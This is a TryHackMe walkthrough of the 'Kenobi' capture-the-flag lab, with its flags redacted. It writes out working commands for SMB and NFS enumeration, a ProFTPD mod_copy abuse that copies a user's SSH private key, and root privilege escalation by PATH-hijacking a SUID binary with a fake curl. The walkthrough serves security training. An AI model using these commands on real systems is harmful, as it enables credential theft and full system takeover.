# Kenobi — TryHackMe Walkthrough

Platform: TryHackMe  
Room: Kenobi  
Difficulty: Easy  
Category: Linux / CTF / Privilege Escalation  

> ⚠️ **Note**: All flags have been intentionally redacted to comply with TryHackMe’s content-sharing guidelines.

---

## Overview

This room focuses on foundational penetration testing techniques, including:
- Network and service enumeration
- SMB and NFS exploitation
- FTP service abuse (ProFTPD `mod_copy`)
- SSH key compromise
- Linux privilege escalation via SUID binaries and PATH manipulation

---

# Task 1: Enumeration
## Port Scanning
**We start with a full TCP scan to identify open ports and services.**
```bash
nmap -T5 -sC -sV -p- -oN initial.nmap <TARGET_IP>
```
### Open ports discovered (7):
 - 21 – FTP (ProFTPD 1.3.5)

 - 22 – SSH

 - 80 – HTTP (Apache 2.4.41)

 - 111 – RPCBind

 - 139 – Samba

 - 445 – Samba

 - 2049 – NFS

# Task 2: Enumerating SMB Shares
## SMB Share Discovery
```bash
smbclient -L //<TARGET_IP>/ -N
```
**Shares found:**
 - print$
 - anonymous
 - IPC$

### Accessing the Anonymous Share
```bash
smbclient //<TARGET_IP>/anonymous -N
ls
```
**File found:**
 - log.txt
# **Download the file locally:**

```bash
smbget smb://<TARGET_IP>/anonymous/log.txt
```
**Findings from log.txt**
 - Confirms FTP is running on port 21

 - Indicates the FTP service runs as user kenobi

 - Mentions an SSH key was generated for this user

# Task 3: Enumerating NFS
**Port 111 indicates RPC services, commonly associated with NFS.**
```bash
nmap -p 111 --script=nfs-ls,nfs-showmount,nfs-statfs <TARGET_IP>
```
**NFS mount discovered:**
```bash
/var
```
# Task 4: Gaining Initial Access (ProFTPD Exploitation)
## ProFTPD Version Check
**Connect using Netcat:**
```bash
nc <TARGET_IP> 21
```
**Version identified:**
```bash
ProFTPD 1.3.5
```
**Searching for Exploits**
```bash
searchsploit ProFTPD 1.3.5
```
## Exploits found: 4
**Notably, the mod_copy vulnerability allows unauthenticated file copying using SITE CPFR and SITE CPTO.**

## Exploiting mod_copy
**Since FTP runs as user kenobi, we copy the SSH private key to a writable directory.**
```bash
SITE CPFR /home/kenobi/.ssh/id_rsa
SITE CPTO /var/tmp/id_rsa
```

# Task 5: Mounting NFS and Retrieving SSH Key
**Mount the /var share locally:**
```bash
mkdir nfs
sudo mount <TARGET_IP>:/var nfs
```
**Navigate to the temporary directory:**
```bash
cd nfs/tmp
ls
```
**SSH key found:**
 - id_rsa
## **Copy it locally and fix permissions:**
```bash
cp id_rsa ~/kenobi_id_rsa
chmod 600 ~/kenobi_id_rsa
sudo umount nfs
```
# Task 6: SSH Access as Kenobi
```bash
ssh -i kenobi_id_rsa kenobi@<TARGET_IP>
```
**User Flag**
```bash
cat /home/kenobi/user.txt
```
**User flag:**
```bash
*****************
```

# Task 7: Privilege Escalation
**Finding SUID Binaries**
```bash
find / -perm -u=s -type f 2>/dev/null
```
**Suspicious binary identified:**
```bash
/usr/bin/menu
```
**Running it presents a simple menu with multiple options.**
## Binary Analysis
**Using strings shows the binary executes commands like curl without using absolute paths.**

**Because the binary runs with SUID (root) privileges, we can exploit PATH hijacking.**
## PATH Hijacking Exploit
**Create a malicious curl binary:**
```bash
echo /bin/sh > curl
chmod +x curl
```
***Modify PATH:***
```bash
export PATH=/home/kenobi:$PATH
```
***Execute the SUID binary:***
```bash
/usr/bin/menu
```
***Selecting any option spawns a root shell.***

# Task 8: Root Flag
```bash
cd /root
cat root.txt
```
**Root flag:**
```bash
******************
```
## Conclusion
**This room demonstrates:**
 - Network and service enumeration

 - SMB and NFS exploitation

 - ProFTPD mod_copy vulnerability abuse

 - SSH key compromise

 - SUID binary privilege escalation via PATH manipulation
**A solid beginner-friendly Linux privilege escalation lab.**














